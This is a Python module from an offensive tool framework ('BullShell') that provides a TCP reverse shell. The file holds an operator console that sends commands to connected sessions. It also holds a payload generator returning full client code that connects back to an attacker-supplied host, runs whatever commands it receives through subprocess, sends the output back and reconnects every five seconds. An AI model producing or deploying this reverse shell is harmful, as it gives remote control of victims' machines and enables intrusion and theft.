
#basic module description
def description() -> str:
    return "TCP reverse shell"

#basic module rank
def rank() -> str:
    return "Normal"

#basic module date
def date() -> str:
    return "18.04.2026"

#set arguments
def depargs() -> dict:
    return {
        "host": "IPv4 addr",
        "port": "Port"
    }

#imports
from StrFuncs import err, evnt, timenow, beautip, current
import socket, os, threading, sys
from colorama import Fore, Style
from SessionManager import manager
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from listener import Listen

#interact with session
def interact(sid: int) -> None:
    session = manager.getsession(sid)
    if not session:
        print(f"{err()} Manager has no session")
    conn, addr = session["conn"], session["addr"]
    print(f"{evnt()} Connection established from {beautip(addr[0])}:{addr[1]}")
    while True:
        try:
            command = input(f"{Fore.RED}BullShell>{Style.RESET_ALL}").strip()
            if not command:
                continue
            if command == "term":
                break
            conn.send(command.encode())
            rawstr = conn.recv(1024 * 1024).decode(errors="ignore")
            if not rawstr:
                print(f"{evnt()} Client disconnected!")
                manager.remove(sid)     
                break
            print(rawstr)      
        except Exception as g:
            print(g)
            manager.remove(sid)  
            break


#launch func
def launch(args: dict) -> None:
    ip = args.get("host", "127.0.0.1")
    port = int(args.get("port", 8888))
    Listen(ip, port)
    

#source code (only for payloads)
def code(rhost: str, rport: int):
    return """
import time
import socket
import subprocess
import os
lhost = "{rhost}"
lport = {rport}
def connect():
    while True:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        try:
            
            s.connect((lhost, lport))
            while True:
                data = s.recv(1024)
                command = data.decode("utf-8", errors="ignore")
                if command.strip() == "term":
                    break
                elif command.startswith("cd "):
                    try:
                        path = data.decode("utf-8")[3:]
                        os.chdir(path)
                        s.send(f" Changed directory to {os.getcwd()}".encode())
                    except Exception as l:
                        s.send(str(l).encode())
                elif len(data) > 0:
                    proc = subprocess.Popen(data.decode("utf-8"), 
                                            stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                            stdin=subprocess.PIPE)
                    stdout = proc.stdout.read() + proc.stderr.read()
                    s.send(stdout)
                    if not stdout:
                        s.send(b"Ok")
        except Exception:
            pass
        finally:
            s.close()
        time.sleep(5)

if __name__ == "__main__":
    connect()
"""
